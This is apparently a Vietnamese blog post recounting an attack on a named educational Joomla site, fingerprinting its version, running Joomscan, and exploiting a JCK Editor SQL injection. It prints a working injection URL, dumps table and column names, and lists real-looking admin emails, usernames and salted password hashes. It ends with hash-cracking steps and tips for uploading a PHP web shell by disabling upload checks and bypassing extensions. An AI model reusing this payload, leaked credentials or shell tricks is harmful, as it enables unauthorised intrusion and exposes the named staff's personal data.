# TÔI ĐÃ HACK HTTP://CMS.FPT-X.EDU.VN NHƯ THẾ NÀO?

## 0. PHẦN MỞ ĐẦU

Lý do, mình thực hiện kiểm tra trang này là do yêu cầu của một cậu bạn, giữa mình và cậu ta có một cuộc trao đổi nên sẵn tiện mình chia sẻ cho các bạn đọc bài này để hiểu rõ hơn về cách thức kiểm tra một trang website cơ bản chẳng hạn như mục tiêu trong bài viết.

![](https://media.giphy.com/media/QVhQUlQifO3ZId3QVv/giphy.gif)


## 1. XÁC ĐỊNH CÁC THÔNG SỐ CƠ BẢN

Để có thể giải quyết cái bài toán trên của cậu bạn kia, chúng ta cần phải thu thập thông tin, xác định các thông số cơ bản và đánh giá sau đó đưa ra cách thức để kiểm tra phù hợp với mục tiêu. Cụ thể các thông số cơ bản trong bài này chúng ta cần tìm hiểu là:

- Server của mục tiêu này hoạt động là gì? (VPS Linux/Windows)(APACHE/IIS)
- Mã nguồn mục tiêu này sử dụng là gì? (Wordpress/Laravel/Joomla/.../)
- Phiên bản của mã nguồn này đã outdated hay chưa?
- `...`

**Thứ nhất:** Xác định được Server đang hoạt động là Linux/Windows sẽ cho chúng ta biết nên lựa chọn cách kiểm tra nào cho phù hợp.

**Thứ hai:** Xác định mã nguồn giúp chúng ta thu hẹp lại dễ dàng xác định được các lỗ hổng đặc trưng của từng framework.

**Thứ ba:** Xác định phiên bản `outdated` hay chưa sẽ giúp chúng ta có thêm nhiều cách kiểm tra, vì phiên bản `outdated` sẽ tồn tại nhiều lỗ hổng. Xem và tìm hiểu thêm về: [POC](https://timviec365.vn/blog/poc-la-gi-new7679.html) và [CVE](https://resources.cystack.net/zero-day-la-gi-cve-la-gi/) và Xem thêm trang: https://cve.mitre.org/ nhé.

![Minh họa cho các trang outdated <(")](https://media.giphy.com/media/iVDo6InQKyW8o/giphy.gif)

### CÁCH TỚ XÁC ĐỊNH 

Có nhiều cách để kiểm tra những thông số trên, từ thủ công cho đến công cụ hoặc các đặc điểm nhận dạng. Ở đây, tớ dùng cách thủ công đó là kiểm tra `robots.txt` và viewsource <("). Để kiểm tra file `robots.txt` thì hãy thêm phần ```/robots.txt``` vào web nhé.

![image](https://user-images.githubusercontent.com/53977417/137295460-c4c0f653-3fc2-4e4c-a2ca-c9e322d0e860.png)

Theo hình ta thấy, cấu trúc này nó `disallow` path `/administrator/` nếu các bạn đã từng kiểm tra nhiều thì chỉ cần nhìn phần này ta có thể đoán được đây là mã nguồn Joomla rồi. Thử truy cập vào path `/administrator` này để ta có thể biết rõ mã nguồn gì nhé. 

![image](https://user-images.githubusercontent.com/53977417/137295534-045d56bc-3205-4317-9197-ded9476e0551.png)

Chuẩn rồi đó, `JOOMLA` tiếp theo đối với phần thông số `version` nhìn vào giao diện này tớ đoán đây là phiên bản cũ, đối với các phiên bản cũ bạn có thể viewsource vì nó có để version trong này. Ấn tổ hợp phím `CTRL + U` hoặc chuột phải chọn `Viewsource` nhé.

![image](https://user-images.githubusercontent.com/53977417/137295610-c950244f-1926-44ab-926c-b73315310103.png)

```html
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="robots" content="index, follow" />
<meta name="keywords" content="FPT Aptech Iboard, CMS-HCM news and Course Manage System" />
<meta name="description" content="FPT Aptech Iboard News, Information for Students - Pham Phu Phi Author" />
<meta name="generator" content="Joomla! 1.5 - Open Source Content Management" />
<title>Aptech Iboard News - Administration</title>
<link href="/administrator/templates/khepri/favicon.ico" rel="shortcut icon" type="image/x-icon" />
<script type="text/javascript" src="/media/system/js/mootools.js"></script>
```
Bạn có thể nhìn vào thẻ `<meta name="generator">` Ở đây chúng ta thấy `content="Joomla! 1.5 - Open Source Content Management"` như vậy là đã xác định được version của mục tiêu này rồi. Mã nguồn: Joomla - Phiên bản: 1.5 <(")

## 2. XÁC ĐỊNH CÁC CVE TỒN TẠI TRONG MỤC TIÊU TRÊN

Do ở phần 1, chúng ta đã xác định được mã nguồn và phiên bản thì nhận xét đây là phiên bản lỗi thời nên cách tốt nhất là hãy dùng công cụ Joomscan để dò toàn bộ CVE của các phiên bản Joomla trước, từ đó tiến hành thực hiện quá trình khai thác nhé. Joomscan có sourcecode trên github, các bạn git về sử dụng nhé.

![image](https://user-images.githubusercontent.com/53977417/120837780-5744f980-c591-11eb-9f90-02a9dee126aa.png)

Sau khi chạy xong chúng ta sẽ thu được các CVE sau: 

```shell

[+] FireWall Detector
[++] Firewall not detected

[+] Checking module: jckeditor
[++] Joomla Component JCK Editor 6.4.4 - 'parent' SQL Injection
POC: http://cms.fpt-x.edu.vn/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent="%20UNION%20SELECT%20NULL,NULL,0x54683173317374337374,NULL,NULL,NULL,NULL,NULL--%20aa
EDB : https://www.exploit-db.com/exploits/45423/

[+] Detecting Joomla Version
[++] Joomla 1.5.15

[+] Core Joomla Vulnerability
[++] Joomla! 1.5.x - SQL Error Information Disclosure
EDB : https://www.exploit-db.com/exploits/34955/ 

Joomla! < 1.7.0 - Multiple Cross-Site Scripting Vulnerabilities
EDB : https://www.exploit-db.com/exploits/36176/

Joomla! 1.5 < 3.4.5 - Object Injection Remote Command Execution
CVE : CVE-2015-8562
EDB : https://www.exploit-db.com/exploits/38977/

Joomla! 1.0 < 3.4.5 - Object Injection 'x-forwarded-for' Header Remote Code Execution
CVE : CVE-2015-8562 , CVE-2015-8566 
EDB : https://www.exploit-db.com/exploits/39033/
```

Trong số các CVE xuất ra, điều khiến chúng ta chú ý nhất là lỗi `Joomla Component JCK Editor 6.4.4 - 'parent' SQL Injection` nó có cả POC, truy cập vào POC để kiểm tra thử nhé. 

![image](https://user-images.githubusercontent.com/53977417/120838397-f833b480-c591-11eb-8d14-4cdc93f994ab.png)

Tèn tén ten, site này đã bị lỗi SQL Injection via Component JCK Editor, giờ chỉ đơn giản là tiến hành khai thác SQL Injection thông thường. <(")

![image](https://user-images.githubusercontent.com/53977417/120838769-66787700-c592-11eb-9045-4c7c4eda8dd8.png)

```html
<node text="" icon="_closed" selectable="false" url="ibo_banner,ibo_bannerclient,ibo_bannertrack,ibo_categories,ibo_components,ibo_contact_details,ibo_content,ibo_content_frontpage,ibo_content_rating,ibo_core_acl_aro,ibo_core_acl_aro_groups,ibo_core_acl_aro_map,ibo_core_acl_aro_sections,ibo_core_acl_groups_aro_map,ibo_core_log_items,ibo_core_log_searches,ibo_groups,ibo_menu,ibo_menu_types,ibo_messages,ibo_messages_cfg,ibo_migration_backlinks,ibo_modules,ibo_modules_menu,ibo_newsfeeds,ibo_plugins,ibo_poll_data,ibo_poll_date,ibo_poll_menu,ibo_polls,ibo_sections,ibo_session,ibo_stats_agents,ibo_templates_menu,ibo_users,ibo_weblinks"> </node>
```

![image](https://user-images.githubusercontent.com/53977417/120839007-a63f5e80-c592-11eb-880f-a4bb8ad65d0b.png)

```html
<nodes>
<node text="" icon="_closed" selectable="false" url="id,name,username,email,password,usertype,block,sendEmail,gid,registerDate,lastvisitDate,activation,params"> </node>
</nodes>
```

![image](https://user-images.githubusercontent.com/53977417/120839388-15b54e00-c593-11eb-9cc7-9faf2aedb035.png)

```html
<nodes>
<node text="" icon="_closed" selectable="false" url="62|phuphi.80@mail.com|iboardadmin|b0944741c876f80cecb2ae4614629f0c,63|phipp@fpt.com.vn|phipp|711a00d5f9d89db047089a0f3e796d93:i76l3wDzPrSjJimcdUnHRzcGPtWS06sI,88|dungnm@fpt.com.vn|DungNM|dcf0e49476c8a80695c2bc02b76c4d0d:TZRt8IH5keCGg5mb32oyi3OJGkICcInf,89|binhtt@fpt.edu.vn|binhtt|38ed0ef8909ea274b83a1721b37f67f2:G9guVztcbirUeKFSt92wRH1ikqxERLoG,86|phunglv@fpt.edu.vn|phunglv|d4dba7fbeaf7f1cad6b77b3ef5a6825d:SujNXMdj4uGujdRCI4dngJO4SKxFkEzO,87|truongnpk@fpt.edu.vn|truongnpk|17d325d7dc7c912d0fa3634ac03301f1:qzunXOftPrMpUsE0y3XY5n3kSGEb6M50,74|phongna@fpt.edu.vn|phongna|66eb9743fcd396e7dea5819e9256cbed:8bakqusoU6TzUK59XGfq6SIkoH2Jjqpv,90|vietnq@fpt.edu.vn|vietnq|68d2d21db027c0532994d3dd6dcdd2d2:BSwa7HKRiuxbaPsz16COMbLJjXBHUF26,91|haims@fpt.edu.vn|haims|06b4ca002fadf3f4349a5706f266a3e9:UYusc2gwQKI1H8dtXo7xCL8bAAkcAkmQ,92|diepnn4@fpt.com.vn|diepnn4|9bcc9af5bb1429bd6fd4b11e53ad1a59:c5orglHgQbjQBZEahsWCr0C6DIRQbMvv,93|ducnv8@fpt.com.vn|ducnv8|2a35323a7f29eed06879a6e77a508695:Zbk3skwErS7xPxPrrGSSGDGiDEkWPbaQ,94|trainv"> </node>
</nodes>
```

Vậy là đã dump xong thông tin đăng nhập rồi, nhìn vào các dạng hash ta có thể đoán được đoạn đầu tiên sử dụng md5 còn lại là các hash khác nhau. Do vậy ta có thể thử vận may bằng cách decrypt hashmd5 xem trên hashkiller có lưu trữ lại chuỗi hash này không nhé. 

![image](https://user-images.githubusercontent.com/53977417/120839688-73e23100-c593-11eb-9155-b0a00b98edfe.png)

Vậy là xong rồi, tớ sẽ ngừng bài viết này ở đây, còn các cậu muốn tìm hiểu hay upshell chiếm server rồi get root tớ không can thiệp hẻ. 

**Mách nhỏ:** Muốn upload shell Joomla, hãy config lại Legal Extensions (File Types), tắt đi chức năng Restrict Uploads và Check MIME Types, thêm định dang MIME Types cần thiết và thử bypass extension nhé. VD: Shell.php -> Shell.pHp, .phP, .php3, .php5,.. 

![image](https://media.giphy.com/media/s4Q3geM5T1XCo/source.gif)






